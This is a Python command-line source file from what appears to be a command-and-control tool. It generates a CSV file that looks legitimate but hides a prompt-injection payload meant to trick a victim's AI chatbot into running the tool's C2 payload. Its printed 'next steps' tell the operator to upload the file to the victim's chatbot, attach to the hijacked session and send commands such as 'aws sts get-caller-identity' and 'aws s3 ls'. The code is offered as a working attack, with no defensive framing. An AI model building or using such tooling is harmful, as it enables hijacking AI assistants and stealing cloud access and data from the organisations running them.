"""Generate command for creating malicious payloads."""

from pathlib import Path

import click

from c2.core.config import get_config
from c2.core.payload_generator import generate_malicious_csv, generate_session_id

SESSION_ID_FILE = ".session_id"


@click.command("generate-csv")
@click.option(
    "--session",
    "-s",
    default=None,
    help="Session ID (auto-generated if not specified)",
)
@click.option(
    "--output",
    "-o",
    default="malicious_data.csv",
    help="Output CSV file path (default: malicious_data.csv)",
)
@click.option(
    "--style",
    type=click.Choice(["technical", "social", "minimal"]),
    default="technical",
    help="Injection style (default: technical)",
)
@click.option(
    "--rows",
    default=5,
    type=int,
    help="Number of data rows to generate (default: 5)",
)
@click.option(
    "--quiet",
    "-q",
    is_flag=True,
    help="Only output session ID (for scripting)",
)
def generate_csv(session, output, style, rows, quiet):
    """
    Generate a malicious CSV file with embedded prompt injection payload.

    \b
    The generated CSV looks legitimate but contains hidden instructions
    that trick the AI into executing the C2 payload.

    \b
    Examples:
      c2 generate-csv
      c2 generate-csv --session sess_custom123
      c2 generate-csv --style social --rows 10
      c2 generate-csv -o attack.csv -q
    """
    config = get_config()

    session_id = session or generate_session_id()

    info = generate_malicious_csv(
        c2_domain=config.domain,
        session_id=session_id,
        output_path=output,
        injection_style=style,
        num_rows=rows,
    )

    # Save session ID to file for easy access
    Path(SESSION_ID_FILE).write_text(info["session_id"])

    if quiet:
        click.echo(info["session_id"])
    else:
        click.echo(f"\n{'=' * 60}")
        click.echo("  MALICIOUS CSV GENERATED")
        click.echo(f"{'=' * 60}")
        click.echo(f"\n  File:       {info['output_path']}")
        click.echo(f"  Session ID: {info['session_id']}")
        click.echo(f"  C2 Domain:  {info['c2_domain']}")
        click.echo(f"\n{'-' * 60}")
        click.echo("  NEXT STEPS:")
        click.echo(f"{'-' * 60}")
        click.echo(f"\n  1. Upload CSV to victim's chatbot web interface:")
        click.echo(f"     {info['output_path']}")
        click.echo(f"\n  2. Attach to the session:")
        click.echo(f"     make attach")
        click.echo(f"     # or: c2 attach {info['session_id']}")
        click.echo(f"\n  3. Send commands:")
        click.echo("     whoami")
        click.echo("     aws sts get-caller-identity")
        click.echo("     aws s3 ls")
        click.echo(f"\n{'=' * 60}")
        click.echo(f"  Session ID saved to: {SESSION_ID_FILE}")
        click.echo(f"  Session ID: {info['session_id']}")
        click.echo(f"{'=' * 60}\n")
